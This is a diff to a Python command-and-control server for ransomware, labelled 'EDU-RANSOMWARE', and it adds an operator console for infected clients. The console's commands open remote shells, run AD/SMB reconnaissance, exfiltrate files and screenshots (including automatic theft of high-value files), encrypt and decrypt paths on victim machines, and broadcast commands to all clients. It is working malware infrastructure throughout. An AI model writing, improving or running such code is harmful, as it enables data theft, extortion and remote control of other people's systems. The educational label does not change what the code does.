-    print(f"    Server IP: {socket.gethostbyname(socket.gethostname())}")
-    print(f"========================================{Colors.ENDC}")
 
-    # Server Shell in eigenem Threat starten
-    threading.Thread(target=server_shell, daemon=True).start()
+def _print_help() -> None:
+    print(f"{Colors.HEADER}[*] Available commands:{Colors.ENDC}")
+    print("  sessions                       - Show all active sessions")
+    print("  interact <id>                  - Open interactive shell for one client")
+    print("  recon <id>                     - Start AD/SMB reconnaissance")
+    print("  exfil <id> <remote_path>       - Download one file from client")
+    print("  auto-exfil <id>                - Exfiltrate high-value files automatically")
+    print("  exfil-screenshot <id>          - Exfiltrate one screenshot")
+    print("  encrypt <id> <path>            - Encrypt target path on one client")
+    print("  decrypt <id> [path]            - Decrypt files on one client")
+    print("  kill <id>                      - Send kill command to one client")
+    print("  broadcast <cmd>                - Send command to all clients")
+    print("  help                           - Show command reference")
+    print("  exit                           - Shutdown C2 server")
+
+
+def _run_interactive_client_shell(cid: int) -> None:
+    with lock:
+        client_exists = cid in clients
+    if not client_exists:
+        print(f"{Colors.WARNING}[!] Client ID {cid} not found{Colors.ENDC}")
+        return
+
+    print(
+        f"{Colors.HEADER}[*] Interacting with ID {cid}. "
+        f"Type 'background' to return.{Colors.ENDC}"
+    )
+
+    while not shutdown_event.is_set():
+        try:
+            sub_command = input(f"ID {cid} @ Shell> ").strip()
+        except EOFError:
+            print()
+            return
+
+        if not sub_command:
+            continue
+        if sub_command == "background":
+            return
+
+        if sub_command.startswith("encrypt "):
+            _, target_path = sub_command.split(" ", 1)
+            encrypt_target(cid, target_path)
+            continue
+
+        if sub_command == "decrypt":
+            decrypt_target(cid)
+            continue
+
+        if sub_command.startswith("decrypt "):
+            _, target_path = sub_command.split(" ", 1)
+            decrypt_target(cid, target_path)
+            continue
+
+        if sub_command.startswith("exfil "):
+            send_command_to_client(cid, sub_command)
+            print(f"{Colors.WARNING}[*] Waiting for data transfer...{Colors.ENDC}")
+            continue
+
+        if sub_command == "auto-exfil":
+            send_command_to_client(cid, "auto-exfil")
+            print(
+                f"{Colors.WARNING}[*] Auto-exfil started on client {cid}.{Colors.ENDC}"
+            )
+            continue
+
+        if sub_command == "exfil-screenshot":
+            send_command_to_client(cid, "exfil-screenshot")
+            print(f"{Colors.WARNING}[*] Screenshot exfil started on ID {cid}.{Colors.ENDC}")
+            continue
+
+        if sub_command == "recon":
+            send_command_to_client(cid, "recon")
+            print(
+                f"{Colors.HEADER}[*] Network reconnaissance started on ID {cid}."
+                f"{Colors.ENDC}"
+            )
+            continue
+
+        if sub_command == "kill":
+            kill_client(cid)
+            continue
+
+        send_command_to_client(cid, sub_command)
+
+
+def _handle_broadcast(command: str) -> None:
+    if command.startswith("encrypt "):
+        _, target_path = command.split(" ", 1)
+        broadcast_command(f"encrypt {target_path}")
+        print(f"[+] Encrypt command for '{target_path}' sent to all clients")
+        return
+
+    if command == "decrypt":
+        broadcast_command("decrypt")
+        print("[+] Decrypt command sent to all clients")
+        return
+
+    if command == "auto-exfil":
+        broadcast_command("auto-exfil")
+        print(f"{Colors.WARNING}[+] Auto-exfil sent to all clients{Colors.ENDC}")
+        return
+
+    if command == "exfil-screenshot":
+        broadcast_command("exfil-screenshot")
+        print(f"{Colors.WARNING}[+] Screenshot exfil sent to all clients{Colors.ENDC}")
+        return
+
+    if command == "recon":
+        broadcast_command("recon")
+        print(f"{Colors.HEADER}[+] Recon command sent to all clients{Colors.ENDC}")
+        return
+
+    broadcast_command(command)
+
+
+def server_shell() -> None:
+    """Run the interactive C2 command shell for operator input and dispatch."""
+
+    _ensure_loot_dir()
+    print(f"{Colors.BOLD}--- C2 COMMAND CENTER READY ---{Colors.ENDC}")
+
+    while not shutdown_event.is_set():
+        try:
+            command = input("C2> ").strip()
+        except EOFError:
+            print()
+            shutdown_event.set()
+            break
+
+        if not command:
+            continue
+
+        if command == "sessions":
+            list_sessions()
+            continue
+
+        if command.startswith("interact "):
+            parts = command.split(" ", 1)
+            cid = _parse_client_id(parts[1]) if len(parts) == 2 else None
+            if cid is not None:
+                _run_interactive_client_shell(cid)
+            continue
+
+        if command.startswith("encrypt "):
+            parts = command.split(" ", 2)
+            if len(parts) != 3:
+                print("[!] Usage: encrypt <client_id> <target_path>")
+                continue
+            cid = _parse_client_id(parts[1])
+            if cid is not None:
+                encrypt_target(cid, parts[2])
+            continue
+
+        if command.startswith("kill "):
+            parts = command.split(" ", 1)
+            if len(parts) != 2:
+                print("[!] Usage: kill <client_id>")
+                continue
+            cid = _parse_client_id(parts[1])
+            if cid is not None:
+                kill_client(cid)
+            continue
+
+        if command.startswith("decrypt "):
+            parts = command.split(" ", 2)
+            if len(parts) not in (2, 3):
+                print("[!] Usage: decrypt <client_id> [path]")
+                continue
+            cid = _parse_client_id(parts[1])
+            if cid is None:
+                continue
+            if len(parts) == 3:
+                decrypt_target(cid, parts[2])
+            else:
+                decrypt_target(cid)
+            continue
+
+        if command.startswith("broadcast "):
+            payload = command[len("broadcast ") :].strip()
+            if not payload:
+                print("[!] Usage: broadcast <command>")
+                continue
+            _handle_broadcast(payload)
+            continue
+
+        if command.startswith("auto-exfil "):
+            parts = command.split(" ", 1)
+            if len(parts) != 2:
+                print("[!] Usage: auto-exfil <client_id>")
+                continue
+            cid = _parse_client_id(parts[1])
+            if cid is not None:
+                send_command_to_client(cid, "auto-exfil")
+                print(
+                    f"{Colors.WARNING}[*] Auto-exfil started on client {cid}."
+                    f"{Colors.ENDC}"
+                )
+            continue
+
+        if command.startswith("exfil-screenshot "):
+            parts = command.split(" ", 1)
+            if len(parts) != 2:
+                print("[!] Usage: exfil-screenshot <client_id>")
+                continue
+            cid = _parse_client_id(parts[1])
+            if cid is not None:
+                send_command_to_client(cid, "exfil-screenshot")
+                print(
+                    f"{Colors.WARNING}[*] Screenshot exfil started on client {cid}."
+                    f"{Colors.ENDC}"
+                )
+            continue
+
+        if command.startswith("exfil "):
+            parts = command.split(" ", 2)
+            if len(parts) != 3:
+                print("[!] Usage: exfil <client_id> <remote_filepath>")
+                continue
+            cid = _parse_client_id(parts[1])
+            if cid is not None:
+                remote_path = parts[2]
+                send_command_to_client(cid, f"exfil {remote_path}")
+                print(
+                    f"{Colors.WARNING}[*] Requesting '{remote_path}' from ID {cid}."
+                    f"{Colors.ENDC}"
+                )
+            continue
+
+        if command.startswith("recon "):
+            parts = command.split(" ", 1)
+            if len(parts) != 2:
+                print("[!] Usage: recon <client_id>")
+                continue
+            cid = _parse_client_id(parts[1])
+            if cid is not None:
+                send_command_to_client(cid, "recon")
+                print(
+                    f"{Colors.HEADER}[*] Network reconnaissance started on ID {cid}."
+                    f"{Colors.ENDC}"
+                )
+            continue
+
+        if command == "help":
+            _print_help()
+            continue
+
+        if command == "exit":
+            print(f"{Colors.FAIL}[!] Shutting down...{Colors.ENDC}")
+            shutdown_event.set()
+            _close_all_clients()
+            return
+
+        print("[!] Unknown command. Type 'help'.")
+
+
+def main() -> None:
+    """Start the TCP C2 listener and spawn handler threads for incoming clients."""
+
+    global client_id
+
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
     try:
-        while True:
-            conn, addr = server.accept()
+        server_socket.bind((LISTEN_HOST, LISTEN_PORT))
+    except OSError as error:
+        print(f"{Colors.FAIL}[!] Could not bind port {LISTEN_PORT}: {error}{Colors.ENDC}")
+        return
+
+    server_socket.listen(SOCKET_BACKLOG)
+    server_socket.settimeout(1.0)
+
+    print(f"[*] C2 server started on port {LISTEN_PORT}")
+    print(f"{Colors.HEADER}========================================")
+    print("    EDU-RANSOMWARE C2 SERVER")
+    print(f"    Listening on {LISTEN_HOST}:{LISTEN_PORT}")
+    print(f"========================================{Colors.ENDC}")
+
+    shell_thread = threading.Thread(target=server_shell, daemon=True, name="c2-shell")
+    shell_thread.start()
+
+    try:
+        while not shutdown_event.is_set():
+            try:
+                conn, addr = server_socket.accept()
+            except socket.timeout:
+                continue
+            except OSError as error:
+                if shutdown_event.is_set():
+                    break
+                print(f"{Colors.FAIL}[!] Accept failed: {error}{Colors.ENDC}")
+                continue
+
             print("Client connected from", addr)
             print("Local IP used for this connection:", conn.getsockname()[0])
+
             with lock:
                 client_id += 1
-                client_thread = threading.Thread(
-                    target=handle_client,
-                    args=(conn, addr, client_id),
-                )
-                client_thread.daemon = True
-                client_thread.start()
+                cid = client_id
+
+            client_thread = threading.Thread(
+                target=handle_client,
+                args=(conn, addr, cid),
+                daemon=True,
+                name=f"client-{cid}",
+            )
+            client_thread.start()
 
     except KeyboardInterrupt:
-        print("\n[!] Shutting down Server")
+        print("\n[!] Keyboard interrupt received. Shutting down server")
+        shutdown_event.set()
     finally:
-        server.close()
+        _close_all_clients()
+        try:
+            server_socket.close()
+        except OSError:
+            pass
         sys.exit(0)
 
 
